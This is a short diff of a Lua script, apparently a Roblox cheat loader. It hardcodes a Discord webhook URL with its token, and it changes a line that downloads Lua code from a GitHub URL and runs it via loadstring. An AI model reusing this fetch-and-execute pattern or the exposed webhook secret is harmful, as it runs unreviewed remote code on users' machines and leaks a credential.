@@ -542,7 +542,7 @@ if getserver.StatusCode == 200 and gethwid.StatusCode == 200 then
                     })
                     
                     getgenv().WebhookHere = ("https://discord.com/api/webhooks/1077262791829893222/iud-LoGPDDMtq88OlAc0iPTeGa4gQFJQY9az4zeJ20C6UD7Rr8hspd8DflKBrgp0ZFAC"),
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/WETHUBv1/WetHubv1/main/Loading.lua"))()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Galiverking/CheckPointWT/main/Check2"))()
                     
                     local blur = Instance.new("BlurEffect", game.Lighting)
                     blur.Size = 0
